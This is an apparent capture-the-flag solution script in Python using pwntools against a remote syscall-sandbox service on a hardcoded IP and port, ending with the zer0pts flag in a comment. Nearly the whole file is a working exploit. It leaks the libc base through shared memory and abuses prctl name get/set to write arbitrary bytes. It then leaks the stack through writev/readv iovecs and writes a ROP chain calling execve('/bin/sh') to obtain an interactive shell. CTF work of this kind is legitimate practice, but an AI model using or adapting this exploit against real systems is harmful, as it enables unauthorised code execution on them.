import pwn


HOST, PORT = '13.231.207.73', 9006

SYS_readv = 19
SYS_writev = 20
SYS_shmget = 29
SYS_shmat = 30
SYS_prctl = 157
PR_SET_NAME = 15
PR_GET_NAME = 16


def syscall(p, no, a1, a2, a3, read=False):
    p.sendlineafter('syscall: ', str(no))
    p.sendlineafter('arg1: ', str(a1))
    p.sendlineafter('arg2: ', str(a2))
    p.sendlineafter('arg3: ', str(a3))

    if read:
        return

    p.recvline()
    data = p.recvuntil('retval: ', drop=True)
    return data, int(p.recvline(keepends=False), 16)


def writeb(offset, ch):
    p = pwn.remote(HOST, PORT)
    pwn.context.log_level = 'INFO'

    _, shm_base = syscall(p, SYS_shmat, mid, 0x0, 0)
    libc_base = shm_base - 0xBB8000

    src = libc_base + next(libc.search(pwn.p8(ch)))
    syscall(p, SYS_prctl, PR_SET_NAME, src, 0)
    syscall(p, SYS_prctl, PR_GET_NAME, shm_base + offset, 0)

    pwn.context.log_level = 'DEBUG'
    p.close()


p = pwn.remote(HOST, PORT)
pwn.context.os = 'linux'
pwn.context.arch = 'amd64'
pwn.context.log_level = 'DEBUG'

libc = pwn.ELF('./libc.so.6')

_, mid = syscall(p, SYS_shmget, 0x1337, 0x1000, 0o1666)
_, shm_base = syscall(p, SYS_shmat, mid, 0, 0)
pwn.log.info('shmaddr: 0x{:012X}'.format(shm_base))
libc_base = shm_base - 0xBB8000
pwn.log.info('libc.so.6: 0x{:012X}'.format(libc_base))

environ = libc_base + libc.symbols[b'environ']

iovec = pwn.p64(environ)
iovec += pwn.p64(0x8)

for i, x in enumerate(iovec):
    writeb(i, x)

data, _ = syscall(p, SYS_writev, 1, shm_base, 1)
environ = pwn.u64(data)
pwn.log.info('environ: 0x{:012X}'.format(environ))

execve = libc_base + libc.symbols[b'execve']
str_bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc_base + next(libc.search(pwn.asm('pop rdi; ret')))
pop_rsi = libc_base + next(libc.search(pwn.asm('pop rsi; ret')))
pop_rdx = libc_base + next(libc.search(pwn.asm('pop rdx; ret')))

payload = pwn.p64(pop_rdi)
payload += pwn.p64(str_bin_sh)
payload += pwn.p64(pop_rsi)
payload += pwn.p64(0)
payload += pwn.p64(pop_rdx)
payload += pwn.p64(0)
payload += pwn.p64(execve)

ret_addr = environ - 0x100
iovec = pwn.p64(ret_addr)
iovec += pwn.p64(len(payload))

for i, x in enumerate(iovec):
    writeb(i, x)

syscall(p, SYS_readv, 0, shm_base, 1, read=True)

p.send(payload)

for i in range(6):
    syscall(p, 3, 3, 0, 0)

pwn.context.log_level = 'INFO'
p.interactive()

# zer0pts{n0_w4y!_i_b4nn3d_3v3ry_d4ng3r0us_sysc4ll!}
